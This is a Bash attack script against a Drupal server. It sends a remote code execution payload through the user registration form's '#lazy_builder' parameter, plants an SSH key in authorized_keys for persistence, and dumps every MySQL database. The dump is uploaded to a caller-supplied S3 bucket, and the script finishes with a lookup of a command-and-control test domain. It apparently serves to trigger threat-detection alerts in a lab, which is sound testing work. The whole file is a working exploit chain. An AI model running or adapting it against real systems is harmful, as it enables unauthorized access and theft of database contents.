!#/usr/bin/env bash

set -euo pipefail

readonly IP=$1
readonly BUCKET=$2

main () {
    test_for_exploit
    add_ssh_keys
    dump_database
    callback_to_known_c2
}

test_for_exploit () {
    exploit 'echo "Exploit is ready" > hello.txt'
    curl --fail "http://${IP}/hello.txt"
}

add_ssh_keys () {
    if [ ! -f /tmp/exploit_key ]; then
        ssh-keygen -q -N '' -t rsa -b 4096 -f /tmp/exploit_key
    fi

    public_key=$(cat /tmp/exploit_key.pub)

    exploit "echo '${public_key}' >> /home/ubuntu/.ssh/authorized_keys"
}

exploit () {
    curl "http://${IP}/user/register?element_parents=timezone/timezone/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
        --data 'form_id=user_register_form' \
        --data '_drupal_ajax=1' \
        --data 'timezone[a][#lazy_builder][]=exec' \
        --data-urlencode "timezone[a][#lazy_builder][][]=${1}"
}

dump_database () {
    readonly DEST="https://${BUCKET}.s3.amazonaws.com/${IP}-$(date "+%F-%T").sql.gz"
    ssh -i /tmp/exploit_key ubuntu@${IP} "sudo mysqldump --all-databases | gzip > /dev/shm/databases.sql.gz"
    ssh -i /tmp/exploit_key ubuntu@${IP} "curl -X PUT -T databases.sql.gz -L '${DEST}'"
}

callback_to_known_c2 () {
    ssh -i /tmp/exploit_key ubuntu@${IP} 'dig guarddutyc2activityb.com any'
}

main